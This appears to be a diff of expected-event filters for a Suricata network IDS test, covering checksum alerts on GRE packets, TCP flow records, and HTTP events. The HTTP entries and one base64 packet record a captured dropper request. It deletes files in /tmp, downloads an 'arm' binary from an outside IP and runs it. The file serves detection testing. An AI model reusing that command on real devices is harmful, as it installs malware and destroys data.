+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABmudUAAB0viH08X8/rAOvvShAAiL4AAAAAEAMAAgAABYAAIFL/AwAACQ8JAAAIAEUgADTSBEAAQAa73n7LOUApbDSKAFDVAg3fUQGRVS4TgBEAcqX3AAABAQgKPRCJiQAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 45
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABmsuIAAB0vj3A8X8/rAOvvShAAiL4AAAAAEAMAAgAABYAAIFL/AwAACQ8JAAAIAEUgADTSA0AAQAa7337LOUApbDSKAFDVAg3fUQGRVS4TgBEAcqYeAAABAQgKPRCJYgAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 43
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFAAFW0HgAAB0vcQo8X8/rAOvvShAAiL4AAAAAEAMAAgAAAAMACQ8JAAAAIFL/AwAIAEUAASQ+REAALwZfzylsNIp+yzlA1PgAUJFLVg6v9/DugBgFtI86AAABAQgKAABo1z0QguhHRVQgL3NoZWxsP2NkKy90bXA7cm0rLXJmKyo7d2dldCsgaHR0cDovLzIzLjk0LjcuMTc1Ly5zNHkvYXJtO3NoKy90bXAvYXJtIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBIZWxsbywgd29ybGQNCkhvc3Q6IDEyNy4wLjAuMTo4MA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQo=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 17
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFAABm/u4AAB0vQ4Q8X8/rAOvvShAAiL4AAAAAEAMAAgAAAAMAPBBZuHEAIFL/AwAIAEUAADTSCkAAPwa9Auk+9yMpbDSKjdXVAg3fUQGRVS4TgBEAcgU9AAABAQgKPRCcyAAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 58
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABmHzwAAB0vIxc8X8/rAOvvShAAiL4AAAAAEAMAAgAAAAMAPBBZuHEAIFL/AwAIAEUgADTSB0AAPwa8237LOUApbDSKAFDVAg3fUQGRVS4TgBEAcqPUAAABAQgKPRCLrAAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 52
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABmyFcAAB0vefs8X8/rAOvvShAAiL4AAAAAEAMAAgAAAAMAPBBZuHEAIFL/AwAIAEUgADTSBUAAPwa83X7LOUApbDSKAFDVAg3fUQGRVS4TgBEAcqWpAAABAQgKPRCJ1wAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 48
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABmHzsAAB0vIxg8X8/rAOvvShAAiL4AAAAAEAMAAgAABYAAIFL/AwAACQ8JAAAIAEUgADTSB0AAQAa7237LOUApbDSKAFDVAg3fUQGRVS4TgBEAcqPUAAABAQgKPRCLrAAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 51
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFAABmMm8AAB0vEAQ8X8/rAOvvShAAiL4AAAAAEAMAAgAABYAAIFL/AwAACQ8JAAAIAEUAADTSC0AAQAZiysQZ1M8pbDSKAFDVAg3fUQGRVS4TgBEAciYDAAABAQgKPRCwUAAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 59
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFIABuwJQAAP4voLHmL9KMAOvvShAAiL4AAAAAEAIABwAAAGUAUFabqYUACQ8JAAEIAEUgADwAcEAAQAY0PilsNIrEGdTP1QIAUNIWg24AAAAAoAI5CBtmAAACBAW0BAIICj0QhcAAAAAAAQMDAg==
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 38
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABmsuMAAB0vj288X8/rAOvvShAAiL4AAAAAEAMAAgAAAAMAPBBZuHEAIFL/AwAIAEUgADTSA0AAPwa8337LOUApbDSKAFDVAg3fUQGRVS4TgBEAcqYeAAABAQgKPRCJYgAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 44
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFIABuUhkAAP4vDy3mL9KMAOvvShAAiL4AAAAAEAIABwAAAGUAUFabqYUACQ8JAAEIAEUgADwAbUAAQAY0QSlsNIrEGdTP1QIAUNIWg24AAAAAoAI5CB4jAAACBAW0BAIICj0QgwMAAAAAAQMDAg==
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 30
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABmb0gAAB0v0wo8X8/rAOvvShAAiL4AAAAAEAMAAgAABYAAIFL/AwAACQ8JAAAIAEUgADTSCUAAQAa72X7LOUApbDSKAFDVAg3fUQGRVS4TgBEAcpyAAAABAQgKPRCTAAAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 55
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFAABm/u0AAB0vQ4U8X8/rAOvvShAAiL4AAAAAEAMAAgAABYAAIFL/AwAACQ8JAAAIAEUAADTSCkAAQAZiy8QZ1M8pbDSKAFDVAg3fUQGRVS4TgBEAcjmLAAABAQgKPRCcyAAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 57
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFAABm7N0AAP4vdJDmL9KMAOvvShAAiL4AAAAAEAYABgAAACBsMQ4qASMAIFL/AwMIAEUAADTSC0AAPwbgW5wA+HApbDSKl7zVAg3fUQGRVS4TgBEAcgsoAAABAQgKPRCwUAAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 60
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABmb0sAAB0v0wc8X8/rAOvvShAAiL4AAAAAEAMAAgAAAAMAPBBZuHEAIFL/AwAIAEUgADTSCUAAPwa82X7LOUApbDSKAFDVAg3fUQGRVS4TgBEAcpyAAAABAQgKPRCTAAAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 56
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFAABmst0AAB0vj5U8X8/rAOvvShAAiL4AAAAAEAMAAgAAAAMAPBBZuHEAIFL/AwAIAEUAADRyHUAAPwYc5n7LOUApbDSKAFDU+K/38O6RS1b/gBQAeju6AAABAQgKPRCJYgAAaNc=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 42
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABm0ewAAB0vcGY8X8/rAOvvShAAiL4AAAAAEAMAAgAAAAMACQ8JAAAAIFL/AwAIAEUgADRGyEAAMAZXGylsNIp+yzlA1QIAUJFVLhIN31EBgBEFtKdJAAABAQgKAABpXD0QgvY=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 29
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABm4koAAB0vYAg8X8/rAOvvShAAiL4AAAAAEAMAAgAAAAMAPBBZuHEAIFL/AwAIAEUgADTSBkAAPwa83H7LOUApbDSKAFDVAg3fUQGRVS4TgBEAcqUNAAABAQgKPRCKcwAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 50
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABmkTsAAB0vsRc8X8/rAOvvShAAiL4AAAAAEAMAAgAAAAMAPBBZuHEAIFL/AwAIAEUgADTSCEAAPwa82n7LOUApbDSKAFDVAg3fUQGRVS4TgBEAcqFiAAABAQgKPRCOHgAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 54
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFAABmstoAAB0vj5g8X8/rAOvvShAAiL4AAAAAEAMAAgAABYAAIFL/AwAACQ8JAAAIAEUAADRyHUAAQAYb5n7LOUApbDSKAFDU+K/38O6RS1b/gBQAeju6AAABAQgKPRCJYgAAaNc=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 41
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABmkToAAB0vsRg8X8/rAOvvShAAiL4AAAAAEAMAAgAABYAAIFL/AwAACQ8JAAAIAEUgADTSCEAAQAa72n7LOUApbDSKAFDVAg3fUQGRVS4TgBEAcqFiAAABAQgKPRCOHgAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 53
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      dest_ip: 126.203.57.64
+      dest_port: 80
+      event_type: http
+      http.hostname: 127.0.0.1
+      http.http_method: GET
+      http.http_port: 80
+      http.http_user_agent: Hello, world
+      http.length: 0
+      http.protocol: http://23.94.7.175/.s4y/arm;sh+/tmp/arm HTTP/1.1
+      http.url: /shell?cd+/tmp;rm+-rf+*;wget+
+      proto: TCP
+      src_ip: 41.108.52.138
+      src_port: 54520
+      tx_id: 0
+      vlan[0]: 3
+- filter:
+    count: 1
+    match:
+      dest_ip: 40.110.35.23
+      dest_port: 80
+      event_type: http
+      http.hostname: 127.0.0.1
+      http.http_method: GET
+      http.http_port: 80
+      http.http_user_agent: Hello, world
+      http.length: 0
+      http.protocol: http://23.94.7.175/.s4y/arm;sh+/tmp/arm HTTP/1.1
+      http.url: /shell?cd+/tmp;rm+-rf+*;wget+
+      proto: TCP
+      src_ip: 41.108.52.138
+      src_port: 54520
+      tx_id: 0
+      vlan[0]: 7
+- filter:
+    count: 1
+    match:
+      dest_ip: 196.25.212.207
+      dest_port: 80
+      event_type: flow
+      flow.age: 15
+      flow.alerted: false
+      flow.bytes_toclient: 0
+      flow.bytes_toserver: 410
+      flow.pkts_toclient: 0
+      flow.pkts_toserver: 5
+      flow.reason: shutdown
+      flow.state: new
+      proto: TCP
+      src_ip: 41.108.52.138
+      src_port: 54520
+      tcp.state: syn_sent
+      tcp.syn: true
+      tcp.tcp_flags: '02'
+      tcp.tcp_flags_tc: '00'
+      tcp.tcp_flags_ts: '02'
+      vlan[0]: 2
+- filter:
+    count: 1
+    match:
+      dest_ip: 40.110.35.23
+      dest_port: 80
+      event_type: flow
+      flow.age: 0
+      flow.alerted: false
+      flow.bytes_toclient: 156
+      flow.bytes_toserver: 230
+      flow.pkts_toclient: 2
+      flow.pkts_toserver: 3
+      flow.reason: shutdown
+      flow.state: established
+      proto: TCP
+      src_ip: 41.108.52.138
+      src_port: 54530
+      tcp.ack: true
+      tcp.fin: true
+      tcp.state: close_wait
+      tcp.syn: true
+      tcp.tcp_flags: '13'
+      tcp.tcp_flags_tc: '12'
+      tcp.tcp_flags_ts: '13'
+      vlan[0]: 7
+- filter:
+    count: 1
+    match:
+      dest_ip: 41.108.52.138
+      dest_port: 54530
+      event_type: flow
+      flow.age: 0
+      flow.alerted: false
+      flow.bytes_toclient: 0
+      flow.bytes_toserver: 74
+      flow.pkts_toclient: 0
+      flow.pkts_toserver: 1
+      flow.reason: shutdown
+      flow.state: new
+      proto: TCP
+      src_ip: 156.0.248.112
+      src_port: 38844
+      tcp.tcp_flags: '00'
+      tcp.tcp_flags_tc: '00'
+      tcp.tcp_flags_ts: '00'
+      vlan[0]: 6
+- filter:
+    count: 1
+    match:
+      app_proto: http
+      dest_ip: 126.203.57.64
+      dest_port: 80
+      event_type: flow
+      flow.age: 17
+      flow.alerted: false
+      flow.bytes_toclient: 378
+      flow.bytes_toserver: 544
+      flow.pkts_toclient: 5
+      flow.pkts_toserver: 4
+      flow.reason: shutdown
+      flow.state: closed
+      proto: TCP
+      src_ip: 41.108.52.138
+      src_port: 54520
+      tcp.ack: true
+      tcp.fin: true
+      tcp.psh: true
+      tcp.rst: true
+      tcp.state: closed
+      tcp.syn: true
+      tcp.tcp_flags: 1f
+      tcp.tcp_flags_tc: '16'
+      tcp.tcp_flags_ts: 1b
+      vlan[0]: 3
+- filter:
+    count: 1
+    match:
+      dest_ip: 126.203.57.64
+      dest_port: 80
+      event_type: flow
+      flow.age: 0
+      flow.alerted: false
+      flow.bytes_toclient: 66
+      flow.bytes_toserver: 128
+      flow.pkts_toclient: 1
+      flow.pkts_toserver: 2
+      flow.reason: shutdown
+      flow.state: closed
+      proto: TCP
+      src_ip: 41.108.52.138
+      src_port: 34048
+      tcp.ack: true
+      tcp.rst: true
+      tcp.state: closed
+      tcp.syn: true
+      tcp.tcp_flags: '16'
+      tcp.tcp_flags_tc: '12'
+      tcp.tcp_flags_ts: '06'
+      vlan[0]: 3
+- filter:
+    count: 1
+    match:
+      dest_ip: 40.110.35.23
+      dest_port: 80
+      event_type: flow
+      flow.age: 0
+      flow.alerted: false
+      flow.bytes_toclient: 66
+      flow.bytes_toserver: 128
+      flow.pkts_toclient: 1
+      flow.pkts_toserver: 2
+      flow.reason: shutdown
+      flow.state: closed
+      proto: TCP
+      src_ip: 41.108.52.138
+      src_port: 34048
+      tcp.ack: true
+      tcp.rst: true
+      tcp.state: closed
+      tcp.syn: true
+      tcp.tcp_flags: '16'
+      tcp.tcp_flags_tc: '12'
+      tcp.tcp_flags_ts: '06'
+      vlan[0]: 7
+- filter:
+    count: 1
+    match:
+      app_proto: http
+      dest_ip: 40.110.35.23
+      dest_port: 80
+      event_type: flow
+      flow.age: 0
+      flow.alerted: false
+      flow.bytes_toclient: 230
+      flow.bytes_toserver: 544
+      flow.pkts_toclient: 3
+      flow.pkts_toserver: 4
+      flow.reason: shutdown
+      flow.state: established
+      proto: TCP
+      src_ip: 41.108.52.138
+      src_port: 54520
+      tcp.ack: true
+      tcp.fin: true
+      tcp.psh: true
+      tcp.state: close_wait
+      tcp.syn: true
+      tcp.tcp_flags: 1b
+      tcp.tcp_flags_tc: '12'
+      tcp.tcp_flags_ts: 1b
+      vlan[0]: 7
+- filter:
+    count: 1
+    match:
+      dest_ip: 41.108.52.138
+      dest_port: 54530
+      event_type: flow
+      flow.age: 0
+      flow.alerted: false
+      flow.bytes_toclient: 0
+      flow.bytes_toserver: 74
+      flow.pkts_toclient: 0
+      flow.pkts_toserver: 1
+      flow.reason: shutdown
+      flow.state: new
+      proto: TCP
+      src_ip: 233.62.247.35
+      src_port: 36309
+      tcp.tcp_flags: '00'
+      tcp.tcp_flags_tc: '00'
+      tcp.tcp_flags_ts: '00'
+      vlan[0]: 3
+- filter:
+    count: 1
+    match:
+      dest_ip: 126.203.57.64
+      dest_port: 80
+      event_type: flow
+      flow.age: 41
+      flow.alerted: false
+      flow.bytes_toclient: 1192
+      flow.bytes_toserver: 230
+      flow.pkts_toclient: 16
+      flow.pkts_toserver: 3
+      flow.reason: shutdown
+      flow.state: closed
+      proto: TCP
+      src_ip: 41.108.52.138
+      src_port: 54530
+      tcp.ack: true
+      tcp.fin: true
+      tcp.state: last_ack
+      tcp.syn: true
+      tcp.tcp_flags: '13'
+      tcp.tcp_flags_tc: '13'
+      tcp.tcp_flags_ts: '13'
+      vlan[0]: 3
+- filter:
+    count: 1
+    match:
+      dest_ip: 41.108.52.138
+      dest_port: 54530
+      event_type: flow
+      flow.age: 50
+      flow.alerted: false
+      flow.bytes_toclient: 0
+      flow.bytes_toserver: 148
+      flow.pkts_toclient: 0
+      flow.pkts_toserver: 2
+      flow.reason: shutdown
+      flow.state: new
+      proto: TCP
+      src_ip: 196.25.212.207
+      src_port: 80
+      tcp.tcp_flags: '00'
+      tcp.tcp_flags_tc: '00'
+      tcp.tcp_flags_ts: '00'
+      vlan[0]: 3
+- filter:
+    count: 1
+    match:
+      dest_ip: 196.25.212.207
+      dest_port: 80
+      event_type: flow
+      flow.age: 15
+      flow.alerted: false
+      flow.bytes_toclient: 0
+      flow.bytes_toserver: 410
+      flow.pkts_toclient: 0
+      flow.pkts_toserver: 5
+      flow.reason: shutdown
+      flow.state: new
+      proto: TCP
+      src_ip: 41.108.52.138
+      src_port: 54530
+      tcp.state: syn_sent
+      tcp.syn: true
+      tcp.tcp_flags: '02'
+      tcp.tcp_flags_tc: '00'
+      tcp.tcp_flags_ts: '02'
+      vlan[0]: 2
